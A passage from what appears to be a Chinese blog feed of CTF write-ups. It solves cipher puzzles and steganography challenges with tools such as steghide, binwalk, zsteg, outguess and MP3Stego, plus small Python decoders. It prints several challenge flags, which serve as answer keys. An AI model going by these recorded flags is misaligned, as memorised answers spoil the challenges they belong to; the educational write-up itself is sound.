class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;/&#x27;</span>]</span><br><span class="line">cipher=<span class="string">&#x27;FlZNfnF6Qol6e9w17WwQQoGYBQCgIkGTa9w3IQKw&#x27;</span></span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">64</span>):</span><br><span class="line">        <span class="keyword">if</span>(dict[j]==cipher[i]):</span><br><span class="line">            res+=base64_list[j]</span><br><span class="line">print(res)</span><br><span class="line">flag=base64.b64decode(res)</span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment">#b&#x27;BJD&#123;D0_Y0u_kNoW_Th1s_b4se_map&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="NCTF2019-Keyboard"><a href="#NCTF2019-Keyboard" class="headerlink" title="[NCTF2019]Keyboard"></a>[NCTF2019]Keyboard</h2><p>提示键盘</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ooo yyy ii w uuu ee uuuu yyy uuuu y w uuu i i rr w i i rr rrr uuuu rrr uuuu t ii uuuu i w u rrr ee www ee yyy eee www w tt ee</span><br></pre></td></tr></table></figure><p>本想着是键盘密码，但是发现好多重复的，想到手机键盘，尝试python解密。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">strr = <span class="string">&quot;ooo yyy ii w uuu ee uuuu yyy uuuu y w uuu i i rr w i i rr rrr uuuu rrr uuuu t ii uuuu i w u rrr ee www ee yyy eee www w tt ee&quot;</span>.split()</span><br><span class="line">all = &#123;<span class="string">&#x27;none1&#x27;</span>:<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;none2&#x27;</span>:<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;w&#x27;</span>:<span class="string">&#x27;abc&#x27;</span>,<span class="string">&#x27;e&#x27;</span>:<span class="string">&#x27;def&#x27;</span>,<span class="string">&#x27;r&#x27;</span>:<span class="string">&#x27;ghi&#x27;</span>,<span class="string">&#x27;t&#x27;</span>:<span class="string">&#x27;jkl&#x27;</span>,<span class="string">&#x27;y&#x27;</span>:<span class="string">&#x27;mno&#x27;</span>,<span class="string">&#x27;u&#x27;</span>:<span class="string">&#x27;pors&#x27;</span>,<span class="string">&#x27;i&#x27;</span>:<span class="string">&#x27;tuv&#x27;</span>,<span class="string">&#x27;o&#x27;</span>:<span class="string">&#x27;wxyz&#x27;</span>&#125;</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> strr:</span><br><span class="line">    flag+=all[i[<span class="number">0</span>]][len(i)<span class="number">-1</span>]</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h2 id="MRCTF2020-keyboard"><a href="#MRCTF2020-keyboard" class="headerlink" title="[MRCTF2020]keyboard"></a>[MRCTF2020]keyboard</h2><p>重复的次数就是每个键盘上的字母。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">得到的flag用</span><br><span class="line">MRCTF&#123;xxxxxx&#125;形式上叫</span><br><span class="line">都为小写字母</span><br><span class="line"></span><br><span class="line">6</span><br><span class="line">666</span><br><span class="line">22</span><br><span class="line">444</span><br><span class="line">555</span><br><span class="line">33</span><br><span class="line">7</span><br><span class="line">44</span><br><span class="line">666</span><br><span class="line">66</span><br><span class="line">3</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
      
      
      <categories>
          
          <category> CTF-密码 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-密码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-杂项刷题2</title>
      <link href="2019/05/16/CTF-%E6%9D%82%E9%A1%B9%E5%88%B7%E9%A2%981/"/>
      <url>2019/05/16/CTF-%E6%9D%82%E9%A1%B9%E5%88%B7%E9%A2%981/</url>
      
        <content type="html"><![CDATA[<h1 id="中国移动"><a href="#中国移动" class="headerlink" title="中国移动"></a>中国移动</h1><h2 id="音频隐写"><a href="#音频隐写" class="headerlink" title="音频隐写"></a>音频隐写</h2><h3 id="SYN01-powpow"><a href="#SYN01-powpow" class="headerlink" title="SYN01 powpow"></a>SYN01 powpow</h3><p>拿到一个mp4文件，首先想到分帧。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffmpeg -i flag.mp4 -f image2 image%d.jpg</span><br></pre></td></tr></table></figure><p>拿到200+图片，但是查看图片没有什么异常，查看文件属性，有一串base64，解密：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;steghide.sourceforge.net&#x2F;</span><br></pre></td></tr></table></figure><p>提示steghide，但是该工具只能使用jpg，想到分离出来的jpg，但是文件太多也不现实。直接binwalk分析MP4</p><p>文件。</p><p>藏有一个png，使用工具将png转化为jpg，然后使用steghide，密码为password。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">stepic -d -i image.png  &gt; image.jpg</span><br><span class="line">steghide extract -sf image.jpg -p password</span><br><span class="line">wrote extracted data to &quot;base64.txt&quot;</span><br></pre></td></tr></table></figure><p>python base85拿到flag。</p><h3 id="SYN03-binwalk"><a href="#SYN03-binwalk" class="headerlink" title="SYN03 binwalk"></a>SYN03 binwalk</h3><p>提示binwalk，直接分离分离出两张图片，盲水印、compare、stegsolve都试过了，然后最后<code>zsteg</code>拿到flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b8,bgr,msb,yX,prime .. text: &quot;~r0&gt;2Paj()z&quot;</span><br><span class="line">b1,r,lsb,xY         .. text: &quot;ISG&#123;E4sY_StEg4n0gR4pHy&#125;&quot;</span><br><span class="line">b2,r,lsb,xY         .. text: &quot;&gt;PUUUUUUUU&quot;</span><br><span class="line">b2,g,msb,xY         .. file: BIOS (ia32) ROM Ext. (252*512)</span><br></pre></td></tr></table></figure><p>可以看到在r的0通道拿到flag。所以直接<code>stegsolve</code>的<code>data extract</code>。</p><h3 id="SYN02-Easy-stegano"><a href="#SYN02-Easy-stegano" class="headerlink" title="SYN02 Easy_stegano"></a>SYN02 Easy_stegano</h3><p>拿到一个gif，本能的分离，分离出三张图片发现没有太大的信息。直接binwalkgif。分理处一个压缩包，解压一共六个文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady&#x2F;1$ ls</span><br><span class="line">1.png  2.jpg  3.jpg  4.jpg  5.jpg  6.jpg  strange_file.png</span><br></pre></td></tr></table></figure><p>挨个文件查看。</p><p>第一个，在文件的最后：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady&#x2F;1$ strings 1.png </span><br><span class="line">tvUZIHDQ</span><br><span class="line">IEND</span><br><span class="line">Lets begin:</span><br><span class="line">3tKdX</span><br></pre></td></tr></table></figure><p>第二个提示另一种方式，使用outguess，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady&#x2F;1$ strings 2.jpg</span><br><span class="line">Di$60</span><br><span class="line">WM(&amp;</span><br><span class="line">Dont be stupid</span><br><span class="line">Use another method</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~/桌面/steady/<span class="number">1</span>$ outguess -r <span class="number">2.j</span>pg out &amp;&amp; cat out</span><br><span class="line">Reading <span class="number">2.j</span>pg....</span><br><span class="line">Extracting usable bits:   <span class="number">2315</span> bits</span><br><span class="line">Steg retrieve: seed: <span class="number">32</span>, len: <span class="number">16</span></span><br><span class="line">N0LWF</span><br><span class="line">Dont stop</span><br></pre></td></tr></table></figure><p>第三章图片，查看有PK字段，binwalk分离，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady&#x2F;1$ strings 3.jpg</span><br><span class="line">994PK</span><br><span class="line">995PK</span><br><span class="line">996PK</span><br><span class="line">997PK</span><br><span class="line">998PK</span><br><span class="line">999PK</span><br></pre></td></tr></table></figure><p>拿到许多文件，文件都在压缩包内，查看CRC是不是有不同的，其中一个名字为386的文件的CRC与别的不一样。也可以计算文件的md5，可以看到文件386的md5与其他文件不一样。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady&#x2F;output&#x2F;zip&#x2F;_3.jpg.extracted$ md5sum * | sort -k1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady&#x2F;1$ strings &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;368</span><br><span class="line">GoOd 3RlZ30&#x3D;</span><br></pre></td></tr></table></figure><p>第四个exitfool工具,</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~/桌面/steady/<span class="number">1</span>$ exiftool /home/steady/桌面/steady/<span class="number">1</span>/<span class="number">4.j</span>pg</span><br><span class="line">ExifTool Version Number         : <span class="number">12.07</span></span><br><span class="line">File Name                       : <span class="number">4.j</span>pg</span><br><span class="line">Directory                       : /home/steady/桌面/steady/<span class="number">1</span></span><br><span class="line">File Size                       : <span class="number">6.9</span> kB</span><br><span class="line">File Modification Date/Time     : <span class="number">2015</span>:<span class="number">01</span>:<span class="number">18</span> <span class="number">21</span>:<span class="number">14</span>:<span class="number">24</span>+<span class="number">08</span>:<span class="number">00</span></span><br><span class="line">File Access Date/Time           : <span class="number">2020</span>:<span class="number">11</span>:<span class="number">03</span> <span class="number">14</span>:<span class="number">23</span>:<span class="number">47</span>+<span class="number">08</span>:<span class="number">00</span></span><br><span class="line">File Inode Change Date/Time     : <span class="number">2020</span>:<span class="number">11</span>:<span class="number">03</span> <span class="number">14</span>:<span class="number">23</span>:<span class="number">45</span>+<span class="number">08</span>:<span class="number">00</span></span><br><span class="line">File Permissions                : rwxrw-rw-</span><br><span class="line">File Type                       : JPEG</span><br><span class="line">File Type Extension             : jpg</span><br><span class="line">MIME Type                       : image/jpeg</span><br><span class="line">JFIF Version                    : <span class="number">1.01</span></span><br><span class="line">Resolution Unit                 : <span class="literal">None</span></span><br><span class="line">X Resolution                    : <span class="number">1</span></span><br><span class="line">Y Resolution                    : <span class="number">1</span></span><br><span class="line">Exif Byte Order                 : Little-endian (Intel, II)</span><br><span class="line"><span class="comment">#flag</span></span><br><span class="line">Artist                          : If you insist here <span class="keyword">is</span> your gift: ZmxhZ</span><br><span class="line">Comment                         : </span><br><span class="line">Image Width                     : <span class="number">187</span></span><br><span class="line">Image Height                    : <span class="number">186</span></span><br><span class="line">Encoding Process                : Baseline DCT, Huffman coding</span><br><span class="line">Bits Per Sample                 : <span class="number">8</span></span><br><span class="line">Color Components                : <span class="number">3</span></span><br><span class="line">Y Cb Cr Sub Sampling            : YCbCr4:<span class="number">2</span>:<span class="number">0</span> (<span class="number">2</span> <span class="number">2</span>)</span><br><span class="line">Image Size                      : <span class="number">187</span>x186</span><br><span class="line">Megapixels                      : <span class="number">0.035</span></span><br></pre></td></tr></table></figure><p>第五个，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady&#x2F;1$ strings  &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;1&#x2F;5.jpg</span><br><span class="line">&#x3D;Bvz</span><br><span class="line">;&#x3D;Bvz</span><br><span class="line">9!Y$</span><br><span class="line">So easy</span><br><span class="line">Just Look Carefully</span><br></pre></td></tr></table></figure><p>仔细看图片图片上有<code>TaU1w</code>。</p><p>第六个，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady&#x2F;1$ strings  &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;1&#x2F;6.jpg</span><br><span class="line">Here is your last gift</span><br><span class="line">TGUtU</span><br><span class="line">Now form the flag :)</span><br></pre></td></tr></table></figure><p>最后把字符串组成一组。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&quot;3tKdX&quot;,&quot;N0LWF&quot;,&quot;ZmxhZ&quot;,&quot;TaU1w&quot;,&quot;TGUtU&quot;，&quot;3RlZ30&#x3D;&quot;]</span><br></pre></td></tr></table></figure><p>组合起来是<code>3tKdXN0LWF3RlZ30=ZmxhZTGUtU</code>，不是一个正常的base64，想到栅栏，把=号移动到最后面但是最终还是没拿到flag。观察这几串字符，被分成几块，而且=号这一块一定是在最后面的，所以flag很可能就是这几个块随机组合。所以上python脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line">d = [<span class="string">&quot;3tKdX&quot;</span>,<span class="string">&quot;N0LWF&quot;</span>,<span class="string">&quot;ZmxhZ&quot;</span>,<span class="string">&quot;TaU1w&quot;</span>,<span class="string">&quot;TGUtU&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> itertools.permutations(d):</span><br><span class="line">        print(b64decode(<span class="string">&#x27;&#x27;</span>.join(x) + <span class="string">&quot;3RlZ30=&quot;</span>))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;1&#x2F;1.py | grep &quot;flag&quot;</span><br></pre></td></tr></table></figure><p>最后拿到flag。</p><h3 id="slowed"><a href="#slowed" class="headerlink" title="slowed"></a>slowed</h3><p>题目提示slow，打开之后听音乐，发现很慢，使用sox变快一点<code>steady@steady:~/桌面/steady$ sox slowed.wav fast.wav speed 3.2</code>。</p><p>听到了字母的语音。使用Audacity查看频谱图，发现频谱图中有数据，通过修改频率也是看不清，直接使用sox。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sox slowed.wav -n spectrogram</span><br></pre></td></tr></table></figure><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/58.png" alt="58"></p><p>可以看到不太清楚，直接使用sox再次优化。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sox slowed.wav -n spectrogram -z 30 -Z -20 -x 1600</span><br></pre></td></tr></table></figure><p>最后拿到一个下载地址。</p><h2 id="其他隐写"><a href="#其他隐写" class="headerlink" title="其他隐写"></a>其他隐写</h2><h3 id="FRA05-syclovergeek"><a href="#FRA05-syclovergeek" class="headerlink" title="FRA05 syclovergeek"></a>FRA05 syclovergeek</h3><p>MP3隐写，文件名字就是密码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\<span class="number">12521</span>\Desktop\CTFTools\信息隐藏\MP3Stego_1_1_18\MP3Stego&gt;MP3StegoDecode.exe -X -P syclovergeek C:\Users\<span class="number">12521</span>\Desktop\syclovergeek.mp3</span><br><span class="line">MP3StegoEncoder <span class="number">1.1</span><span class="number">.17</span></span><br><span class="line">See README file <span class="keyword">for</span> copyright info</span><br><span class="line">Input file = <span class="string">&#x27;C:\Users\12521\Desktop\syclovergeek.mp3&#x27;</span>  output file = <span class="string">&#x27;C:\Users\12521\Desktop\syclovergeek.mp3.pcm&#x27;</span></span><br><span class="line">Will attempt to extract hidden information. Output: C:\Users\<span class="number">12521</span>\Desktop\syclovergeek.mp3.txt</span><br><span class="line">the bit stream file C:\Users\<span class="number">12521</span>\Desktop\syclovergeek.mp3 <span class="keyword">is</span> a BINARY file</span><br><span class="line">HDR: s=FFF, id=<span class="number">1</span>, l=<span class="number">3</span>, ep=off, br=<span class="number">9</span>, sf=<span class="number">0</span>, pd=<span class="number">1</span>, pr=<span class="number">0</span>, m=<span class="number">0</span>, js=<span class="number">0</span>, c=<span class="number">0</span>, o=<span class="number">0</span>, e=<span class="number">0</span></span><br><span class="line">alg.=MPEG<span class="number">-1</span>, layer=III, tot bitrate=<span class="number">128</span>, sfrq=<span class="number">44.1</span></span><br><span class="line">mode=stereo, sblim=<span class="number">32</span>, jsbd=<span class="number">32</span>, ch=<span class="number">2</span></span><br><span class="line">[Frame <span class="number">5932</span>]Frame cannot be located</span><br><span class="line">Input stream may be empty</span><br><span class="line">Avg slots/frame = <span class="number">417.962</span>; b/smp = <span class="number">2.90</span>; br = <span class="number">128.001</span> kbps</span><br><span class="line">Decoding of <span class="string">&quot;C:\Users\12521\Desktop\syclovergeek.mp3&quot;</span> <span class="keyword">is</span> finished</span><br><span class="line">The decoded PCM output file name <span class="keyword">is</span> <span class="string">&quot;C:\Users\12521\Desktop\syclovergeek.mp3.pcm&quot;</span></span><br></pre></td></tr></table></figure><h3 id="FRA04-godwave"><a href="#FRA04-godwave" class="headerlink" title="FRA04 godwave"></a>FRA04 godwave</h3><p>使用脚本进行转化。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> wave</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">wav = wave.open(<span class="string">&#x27;/root/桌面/11/godwave.wav&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">params = wav.getparams()</span><br><span class="line">nchannels, sampwidth, framerate, nframes = params[:<span class="number">4</span>]</span><br><span class="line">strData = wav.readframes(nframes)</span><br><span class="line">waveData = numpy.fromstring(strData, dtype=numpy.int16)</span><br><span class="line">waveData = waveData*<span class="number">1.0</span>/(max(abs(waveData)))</span><br><span class="line">string = <span class="string">&#x27;&#x27;</span></span><br><span class="line">norm = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1735680</span>):</span><br><span class="line">    norm = norm+abs(waveData[i])</span><br><span class="line">    <span class="keyword">if</span> (i+<span class="number">1</span>) % <span class="number">64</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> norm &gt; <span class="number">10</span>:</span><br><span class="line">            string += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            string += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        norm = <span class="number">0</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;01output.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> output:</span><br><span class="line">    output.writelines(string)</span><br></pre></td></tr></table></figure><p>拿到一串二进制，进行曼切斯特解密，八个一组转换为ascii，发现是一张png，扫码拿到flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">file_in = open(<span class="string">&#x27;01output.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">code = file_in.readline()</span><br><span class="line">file_in.close()</span><br><span class="line">le = len(str(code))</span><br><span class="line"><span class="keyword">print</span> le</span><br><span class="line"><span class="keyword">print</span> code</span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line">res = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> code != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">    cp = code[:<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> cp != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> cp[<span class="number">0</span>] == <span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> cp[<span class="number">1</span>] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            res = (res&lt;&lt;<span class="number">1</span>)|<span class="number">0</span></span><br><span class="line">            count +=<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> cp[<span class="number">0</span>] == <span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> cp[<span class="number">1</span>] == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            res = (res&lt;&lt;<span class="number">1</span>)|<span class="number">1</span></span><br><span class="line">            count +=<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> count == <span class="number">8</span>:</span><br><span class="line">            result += chr(res)</span><br><span class="line">            count = <span class="number">0</span></span><br><span class="line">            res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;Unexpected cp, exit!&#x27;</span> <span class="comment"># found &#x27;00&#x27; or &#x27;11&#x27;, stop the script directly</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    code = code[<span class="number">2</span>:]</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><h3 id="FRA06-Ogrewatch"><a href="#FRA06-Ogrewatch" class="headerlink" title="FRA06 Ogrewatch"></a>FRA06 Ogrewatch</h3><p>那个一个文件不知道后缀名，使用Linux查看一下，放入linux之后可以直接打开是一个视频，但不是mp4格式。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@root:~&#x2F;桌面&#x2F;flag# file &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;ogreman&#39; </span><br><span class="line">&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;ogreman: Matroska data</span><br></pre></td></tr></table></figure><p>百度了一下是一个MKV文件，也是视频格式的一种，在win下修改后缀为<code>mkv</code>。使用<code>ffmpeg </code>提取文件。分理出一个文件使用命令提取flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ffmpeg -i ogreman -map <span class="number">0</span>:s:<span class="number">0</span> ogreman-subs.srt</span><br><span class="line">grep <span class="string">&quot;font size&quot;</span> ogreman-subs.srt | cut -d<span class="string">&quot;&gt;&quot;</span> -f2</span><br></pre></td></tr></table></figure><h1 id="蓝鲸安全"><a href="#蓝鲸安全" class="headerlink" title="蓝鲸安全"></a>蓝鲸安全</h1><h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><h3 id="我们不一样"><a href="#我们不一样" class="headerlink" title="我们不一样"></a>我们不一样</h3><p>一张图片，提示我们，尝试binwalk拿到一样的图片。不一样需要进行比较，可以使用stegsolve，但是没有发现什么东西。</p><p>尝试kali–compare。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@root:~&#x2F;桌面&#x2F;flag# compare &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;1.png&#39;  &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;2.png&#39;  out.png</span><br></pre></td></tr></table></figure><p>拿到一张图片有异常，在图的左下角，有一块红色区域。使用python将这两个图片不一样的部分的像素打印出来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 